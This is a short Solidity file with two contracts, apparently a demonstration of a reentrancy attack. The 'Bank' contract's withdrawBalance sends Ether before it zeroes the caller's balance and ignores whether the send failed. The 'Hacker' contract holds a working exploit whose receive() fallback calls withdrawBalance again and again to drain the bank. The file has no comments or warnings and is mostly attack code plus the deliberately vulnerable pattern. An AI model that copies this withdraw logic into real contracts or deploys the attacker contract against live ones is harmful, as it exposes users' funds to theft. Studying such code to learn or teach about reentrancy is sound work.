// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract Bank {
    mapping (address => uint256) userBalance;
   
    function getBalance(address u) public view returns(uint256){
        return userBalance[u];
    }

    function getBalance() public view returns(uint256){
        return address(this).balance;
    }

    function addToBalance() public payable{
        userBalance[msg.sender] += msg.value;
    }   

    function withdrawBalance() public payable  {
        (bool sent, ) = msg.sender.call{value: userBalance[msg.sender]}("");
        userBalance[msg.sender] = 0;
    }   
}

contract Hacker {
    Bank bank;

    constructor(address _a) {
        bank = Bank(_a);
    }
    
    function getBalance() public view returns(uint256){
        return address(this).balance;
    }

    function attack() public payable {
        require(msg.value >= 1 ether);
        bank.addToBalance{value: msg.value}();
        bank.withdrawBalance();
    }

    receive() external payable {
        if(bank.getBalance() > 0){
            bank.withdrawBalance();
        }
    }
}